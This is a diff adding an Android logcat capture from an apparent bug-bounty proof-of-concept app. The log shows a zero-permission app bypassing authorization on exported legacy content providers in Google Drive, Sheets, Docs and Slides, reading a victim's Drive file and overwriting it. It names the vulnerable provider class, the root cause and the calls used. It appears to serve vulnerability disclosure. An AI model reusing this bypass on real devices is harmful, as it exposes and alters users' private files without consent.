@@ -1,0 +1,70 @@
+--------- beginning of main
+07-11 14:50:55.741 24794 24822 D VRP_POC : ╔══════════════════════════════════════════════════════════╗
+07-11 14:50:55.741 24794 24822 D VRP_POC : ║  Google Workspace — Systemic Auth Bypass PoC           ║
+07-11 14:50:55.741 24794 24822 D VRP_POC : ║  Drive + Sheets + Docs + Slides                       ║
+07-11 14:50:55.741 24794 24822 D VRP_POC : ║  CWE-862: Missing Authorization via Feature Flag Bug   ║
+07-11 14:50:55.741 24794 24822 D VRP_POC : ╚══════════════════════════════════════════════════════════╝
+07-11 14:50:55.741 24794 24822 D VRP_POC : 
+07-11 14:50:55.741 24794 24822 D VRP_POC : [CONTEXT] UID:     10345
+07-11 14:50:55.741 24794 24822 D VRP_POC : [CONTEXT] PID:     24794
+07-11 14:50:55.741 24794 24822 D VRP_POC : [CONTEXT] Package: com.vrppoc
+07-11 14:50:55.741 24794 24822 D VRP_POC : [CONTEXT] Permissions: NONE (zero-permission app)
+07-11 14:50:55.741 24794 24822 D VRP_POC : 
+07-11 14:50:55.741 24794 24822 D VRP_POC : ═══ STEP 0: Baseline — secured providers block us ═══
+07-11 14:50:55.742 24794 24822 D VRP_POC : [BLOCKED] Drive SAF: SecurityException (proper)
+07-11 14:50:55.742 24794 24822 D VRP_POC : [BLOCKED] Sheets DocList: SecurityException (proper)
+07-11 14:50:55.742 24794 24822 D VRP_POC : [BLOCKED] Docs DocList: SecurityException (proper)
+07-11 14:50:55.743 24794 24822 D VRP_POC : [BLOCKED] Slides DocList: SecurityException (proper)
+07-11 14:50:55.743 24794 24822 D VRP_POC : [BASELINE] All secured providers properly enforce permissions
+07-11 14:50:55.743 24794 24822 D VRP_POC : 
+07-11 14:50:55.743 24794 24822 D VRP_POC : ═══ STEP 1: Feature flag bypass — testing all 4 apps ═══
+07-11 14:50:55.746 24794 24822 D VRP_POC : [BYPASS] Drive: Feature flag DISABLED — NO permission check!
+07-11 14:50:55.793 24794 24822 D VRP_POC : [BYPASS] Sheets: Feature flag DISABLED — NO permission check!
+07-11 14:50:55.847 24794 24822 D VRP_POC : [BYPASS] Docs: Feature flag DISABLED — NO permission check!
+07-11 14:50:55.908 24794 24822 D VRP_POC : [BYPASS] Slides: Feature flag DISABLED — NO permission check!
+07-11 14:50:55.909 24794 24822 D VRP_POC : [RESULT] 4/4 providers BYPASSED
+07-11 14:50:55.909 24794 24822 D VRP_POC : 
+07-11 14:50:55.909 24794 24822 D VRP_POC : ═══ STEP 2: CONFIDENTIALITY — Steal victim's Drive file ═══
+07-11 14:50:55.909 24794 24822 D VRP_POC : [TARGET] Web portal 4-IV YEAR CSE B.xlsx
+07-11 14:50:55.926 24794 24822 D VRP_POC : [STOLEN-META] Filename: Web portal 4-IV  YEAR CSE B.xlsx
+07-11 14:50:55.926 24794 24822 D VRP_POC : [STOLEN-META] Size:     30 bytes
+07-11 14:50:55.926 24794 24822 D VRP_POC : [STOLEN-META] MIME:     application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+07-11 14:50:55.969 24794 24822 D VRP_POC : [STOLEN-DATA] Read 30 bytes — COMPLETE FILE!
+07-11 14:50:55.969 24794 24822 D VRP_POC : [STOLEN-DATA] Header hex: 41545441434b45525f5041594c4f4144
+07-11 14:50:55.970 24794 24822 D VRP_POC : 
+07-11 14:50:55.970 24794 24822 D VRP_POC : >>> CONFIDENTIALITY IMPACT PROVEN <<<
+07-11 14:50:55.970 24794 24822 D VRP_POC : 
+07-11 14:50:55.970 24794 24822 D VRP_POC : ═══ STEP 3: INTEGRITY — Overwrite victim's Drive file ═══
+07-11 14:50:55.970 24794 24822 D VRP_POC : [ATTACK] Writing: "ATTACKER_PAYLOAD_1783761655970"
+07-11 14:50:55.980 24794 24822 D VRP_POC : [WRITE-OK] openOutputStream("w") succeeded — no SecurityException!
+07-11 14:50:55.980 24794 24822 D VRP_POC : 
+07-11 14:50:55.980 24794 24822 D VRP_POC : ═══ STEP 4: Verify write — read back the file ═══
+07-11 14:50:56.074 24794 24822 D VRP_POC : [VERIFY-DATA] Content: ATTACKER_PAYLOAD_1783761655970
+07-11 14:50:56.074 24794 24822 D VRP_POC : 
+07-11 14:50:56.074 24794 24822 D VRP_POC : >>> INTEGRITY IMPACT PROVEN <<<
+07-11 14:50:56.074 24794 24822 D VRP_POC : 
+07-11 14:50:56.074 24794 24822 D VRP_POC : ═══ STEP 5: All 4 legacy providers — query + openFile ═══
+07-11 14:50:56.074 24794 24822 D VRP_POC : [INFO] Same class: LegacyStorageBackendContentProvider
+07-11 14:50:56.074 24794 24822 D VRP_POC : [INFO] Same code: exported=true, no android:permission, disabled feature flag
+07-11 14:50:56.074 24794 24822 D VRP_POC : 
+07-11 14:50:56.074 24794 24822 D VRP_POC : [Sheets] query() returned null — but NO SecurityException!
+07-11 14:50:56.075 24794 24822 D VRP_POC : [Sheets] openFile() accessible — NO SecurityException! (FileNotFound = no such doc)
+07-11 14:50:56.075 24794 24822 D VRP_POC : [Docs] query() returned null — but NO SecurityException!
+07-11 14:50:56.075 24794 24822 D VRP_POC : [Docs] openFile() accessible — NO SecurityException! (FileNotFound = no such doc)
+07-11 14:50:56.076 24794 24822 D VRP_POC : [Slides] query() returned null — but NO SecurityException!
+07-11 14:50:56.076 24794 24822 D VRP_POC : [Slides] openFile() accessible — NO SecurityException! (FileNotFound = no such doc)
+07-11 14:50:56.076 24794 24822 D VRP_POC : 
+07-11 14:50:56.076 24794 24822 D VRP_POC : ╔══════════════════════════════════════════════════════════╗
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  RESULTS SUMMARY                                       ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ╠══════════════════════════════════════════════════════════╣
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  App permissions: NONE                                  ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  User interaction: NONE                                 ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Secured providers: ALL BLOCKED (baseline ok)           ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Drive legacy:  BYPASSED — C+I proven                  ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Sheets legacy: BYPASSED — same class, exported        ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Docs legacy:   BYPASSED — same class, exported        ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Slides legacy: BYPASSED — same class, exported        ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Root cause: Shared library vulnerability               ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  CWE-862: Missing Authorization                        ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ║  Affected: ALL Google Workspace editor apps             ║
+07-11 14:50:56.076 24794 24822 D VRP_POC : ╚══════════════════════════════════════════════════════════╝
